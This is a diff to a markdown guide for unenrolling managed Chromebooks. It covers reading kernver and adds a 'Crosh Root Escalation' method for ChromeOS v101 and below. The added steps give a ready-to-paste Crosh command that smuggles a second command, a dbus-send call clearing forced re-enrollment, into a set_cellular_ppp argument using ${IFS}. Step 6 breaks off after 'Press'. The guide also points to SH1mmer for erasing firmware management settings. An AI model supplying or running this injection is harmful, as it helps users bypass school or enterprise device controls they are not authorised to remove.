@@ -10,9 +10,17 @@ To verify your kernver and your ChromeOS version, you need to first boot ChromeO
 
 On `oldui` boards (with a white background, such as `snappy` or `octopus`), you just scroll down with your eyes until you find `tpm_ver`, and then look to the right of that to find `kernver`, and your kernver will be the last number to the right of kernver, this means `kernver=0x00010004` is kernver 4 or kv4.
 
-On `newui` boards like `nissa` or `dedede`, you have to use the  key to scroll down to the bottom where you should find kernver
+On `newui` boards like `nissa` or `dedede`, you have to use the `🠟` key to scroll down to the bottom where you should find kernver
 
 # How?
+## ChromeOS v101 and below - Crosh Root Escalation
+1. Login to your Chromebook.
+2. Open Crosh with `ctrl+alt+t`.
+3. Paste the following in:
+`set_cellular_ppp \';dbus-send${IFS}--system${IFS}--print-reply${IFS}--dest=org.chromium.SessionManager${IFS}/org/chromium/SessionManager${IFS}org.chromium.SessionManagerInterface.ClearForcedReEnrollmentVpd;exit;\'`
+4. Press enter.
+5. Press `ctrl+shift+q+q`.
+6. Press                                            
 
 ## ChromeOS v110 and below - SH1mmer
 The preferred unenrollment method for ChromeOS v110 and below is using SH1mmer's very cool "deprovision" option. This takes ownership of the TPM and erases the FWMP, along with making ChromeOS not check for enrollment by putting a parameter in the RW portion of the VPD.
